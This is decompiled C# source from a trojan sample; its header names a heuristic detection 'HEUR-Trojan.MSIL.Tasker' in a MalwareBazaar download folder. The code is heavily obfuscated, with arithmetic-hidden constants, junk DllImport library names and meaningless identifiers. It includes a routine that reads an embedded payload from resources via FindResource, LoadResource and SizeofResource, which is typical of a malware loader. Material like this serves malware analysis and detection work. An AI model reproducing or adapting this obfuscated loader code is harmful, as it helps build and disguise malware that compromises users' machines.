// Decompiled with JetBrains decompiler
// Type: CreatePdbState
// Assembly: hoFmjnnAdk, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7549E1B6-C505-419B-ABCE-260ABB7A8C7E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-c76fad1f33ff3c6ef278984eb885771e7b42fcdcc88e8f3e5cd096a790f14c97.exe

using System;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

internal class CreatePdbState
{
  private static Task<int> Set_UserType()
  {
    // ISSUE: variable of a compiler-generated type
    CreatePdbState.TmOverhang stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_Parent = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.GetHashCodeGlobalType = Convert.ToInt32(-79969.0 - 79969.0) + Convert.ToInt32(2.0 * 35622.0) / \u003CModule\u003E.TimeSpanToken(int.Parse("13")) + Convert.ToInt32(2.0 * 44346.5) / \u003CModule\u003E.TimeSpanToken(int.Parse("3"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_Parent.Start<CreatePdbState.TmOverhang>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.Get_Parent.Task;
  }

  private static Task<int> _tasks()
  {
    // ISSUE: variable of a compiler-generated type
    CreatePdbState.IsParamDef stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.guids = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.Padding = Convert.ToInt32(2.0 * -47277.0) + Convert.ToInt32(15228.118273064623 + Math.Log10(7616.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) + Convert.ToInt32(118981.0 - Math.Truncate(39660.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("9"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.guids.Start<CreatePdbState.IsParamDef>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.guids.Task;
  }

  private static Task<int> GetDayOfMNN()
  {
    // ISSUE: variable of a compiler-generated type
    CreatePdbState.PA_MSIL stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.get_IsFat = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.CorLibAssemblyRef = Convert.ToInt32(5691271360.5 / -53344.5) + Convert.ToInt32(89114.712712130975 - Math.Sin(44557.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("3")) + Convert.ToInt32(17569.056184086632 + Math.Log10(8786.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.get_IsFat.Start<CreatePdbState.PA_MSIL>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.get_IsFat.Task;
  }

  private static Task<int> TEraToken()
  {
    // ISSUE: variable of a compiler-generated type
    CreatePdbState.DeleteVolumeMountPoint stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.ToOffset = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine._writable = Convert.ToInt32(429.61780114947123 + Math.Log(217.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) + (int.Parse("873360476") ^ int.Parse("873404055")) / \u003CModule\u003E.TimeSpanToken(int.Parse("14")) - Convert.ToInt32(97396.206493824924 + Math.Log(48703.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("7"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.ToOffset.Start<CreatePdbState.DeleteVolumeMountPoint>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.ToOffset.Task;
  }

  public static void GetDeviceName()
  {
    Task<int> task = \u003CModule\u003E.\u0098ú\u001D\u0093\u003B();
    \u003CModule\u003E.ôL\u003E3\u0029("Taikkkkkkkkkkkiuiiokkkkkkkkkkd");
    string str1 = \u003CModule\u003E.ê9ÉiÃ();
    \u003CModule\u003E.ôL\u003E3\u0029(\u003CModule\u003E.â\u00A0\u000C\u0026í("The flow of the program is resumed once the task is completed by the asynchronous method and the value is returned ", str1));
    \u003CModule\u003E.ôL\u003E3\u0029("The programl file to count the number of characters in the file");
    int result = task.Result;
    string str2 = \u003CModule\u003E.ê9ÉiÃ();
  }

  [DllImport("kgdffsdfsdfsdfsdfsdgdff#", EntryPoint = "fgfsdfsdfdsffdfgfda", SetLastError = true)]
  private static extern IntPtr RunbmPrefix(IntPtr _param0, IntPtr _param1);

  [DllImport("#fdsf#", EntryPoint = "LoadResource")]
  private static extern IntPtr S_GDATA32_16t(IntPtr _param0, IntPtr _param1);

  [DllImport("#dsd.dll#", EntryPoint = "GetModuleHandle", SetLastError = true)]
  private static extern IntPtr GenericArguments(string _param0);

  [DllImport("#dgsdsdgfg.dpolpll#", EntryPoint = "FindResource", SetLastError = true)]
  private static extern IntPtr Semantics(IntPtr _param0, string _param1, string _param2);

  [DllImport("#fdsdd.pdll#", EntryPoint = "dg")]
  private static extern IntPtr Inheritable(string _param0);

  [DllImport("#fsdfsdsddgd#", EntryPoint = "gshfdfdsdsdfdsdlkolfsdfgsdg", SetLastError = true)]
  private static extern IntPtr GetMethodSemanticsRid(
    IntPtr _param0,
    string _param1,
    string _param2);

  [DllImport("#gfsddsfd.dll#", EntryPoint = "gshfsddfpfdhddgdsg")]
  private static extern IntPtr M_innerExceptions(string _param0);

  [DllImport("#gfssddff.dll#", EntryPoint = "drdseg")]
  private static extern IntPtr FileHeader(string _param0);

  [DllImport("#gdsdsdfsdfdssgdhfdggggggdkksg.dll#", EntryPoint = "gddgldsgsdsdfhsg")]
  private static extern IntPtr Set_Tag(string _param0);

  [DllImport("#gsfhsdfsdsdfgsdgdgsdgf;ddg.dll#", EntryPoint = "SizeofResource", SetLastError = true)]
  private static extern uint extraSections(IntPtr _param0, IntPtr _param1);

  [DllImport("#gsdfgsdfddsdfgfgsd.dll#", EntryPoint = "fsdddf", SetLastError = true)]
  private static extern IntPtr UnicodeEncoding(
    IntPtr _param0,
    string _param1,
    string _param2);

  public static byte[] RelaxedSignature(string _param0, string _param1)
  {
    IntPtr num1 = \u003CModule\u003E.\u0094\u003E\u0098c\u00A6(\u003CModule\u003E.\u00A1\u009Cný\u0001(\u003CModule\u003E.\u00B6Ý\u00A6\u0016µ()));
    IntPtr num2 = \u003CModule\u003E.GsñÒÇ(num1, _param0, _param1);
    IntPtr num3 = \u003CModule\u003E.È3âaA(num1, num2);
    uint length = \u003CModule\u003E.\u00182OÐ\u002F(num1, num2);
    byte[] numArray = new byte[(IntPtr) length];
    \u003CModule\u003E.v\u0090\u00B4Î\u0026(num3, numArray, Convert.ToInt32(-26922.5 - 26922.5) + Convert.ToInt32(86533.166189395924 + Math.Sin(43267.0)) / \u003CModule\u003E.TimeSpanToken(int.Parse("12")) - Convert.ToInt32(32689.356220288271 + Math.Cos(16344.5)) / \u003CModule\u003E.TimeSpanToken(int.Parse("2")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length, (int) length);
    return numArray;
  }

  public static byte[] Get_TypeRef(string _param0, string _param1)
  {
    ResourceManager resourceManager = (ResourceManager) \u003CModule\u003E.H\u0025r\u00A5\u001D(_param1, \u003CModule\u003E.\u00B6Ý\u00A6\u0016µ());
    return (byte[]) \u003CModule\u003E.èúö3\u009B((object) resourceManager, _param0);
  }
}
